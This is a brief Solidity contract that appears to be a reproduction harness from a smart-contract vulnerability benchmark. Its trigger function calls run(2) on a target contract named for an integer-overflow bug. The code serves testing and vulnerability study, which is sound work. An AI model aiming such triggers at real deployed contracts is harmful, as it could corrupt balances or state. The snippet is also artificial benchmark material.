contract ReproductionContract {
    IntegerOverflowMultiTxMultiFuncFeasible target;

    constructor(address _target) public {
        target = IntegerOverflowMultiTxMultiFuncFeasible(_target);
    }

    function trigger() public {
        target.run(2);
    }
}